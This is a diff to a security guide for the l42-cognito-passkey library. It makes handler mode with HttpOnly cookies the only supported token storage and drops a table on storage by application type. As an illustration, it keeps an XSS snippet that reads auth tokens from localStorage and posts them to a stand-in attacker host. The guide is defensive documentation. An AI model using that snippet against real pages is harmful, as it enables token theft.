@@ -4,14 +4,14 @@ This guide covers security mitigations for l42-cognito-passkey, organized by thr
 
 ## Token Storage Risk Assessment
 
-> **Recommended:** Use handler mode (`tokenStorage: 'handler'`) for all production deployments. `localStorage` and `memory` modes are deprecated (removed in v1.0).
+> Handler mode (`tokenStorage: 'handler'`) is the only supported mode as of v0.15.0. Tokens are stored server-side in HttpOnly session cookies, making them inaccessible to JavaScript.
 
-### The Risk (localStorage mode — deprecated)
+### Why Handler Mode?
 
 Tokens stored in localStorage are accessible to any JavaScript running on the page:
 
 ```javascript
-// Attacker-injected code (via XSS)
+// Attacker-injected code (via XSS) — impossible with handler mode
 const token = localStorage.getItem('l42_auth_tokens');
 fetch('https://attacker.com/steal', { body: token });
 ```
@@ -25,13 +25,6 @@ Handler mode eliminates this risk entirely — tokens never appear in JavaScript
 | Drift OAuth Token Theft | 2025 | Supply chain compromise | 700+ orgs, MFA bypassed |
 | jQuery XSS (CVE-2020-11022) | 2020 | Third-party library | Millions of sites vulnerable |
 | ua-parser-js Supply Chain | 2021 | Compromised npm package | 7M weekly downloads affected |
-
-### Risk by Application Type
-
-| Application Type | Recommended Approach |
-|-----------------|----------------------|
-| All production apps | Token Handler mode (HttpOnly cookies) |
-| Prototyping only | localStorage (deprecated) |
 
 ---
 
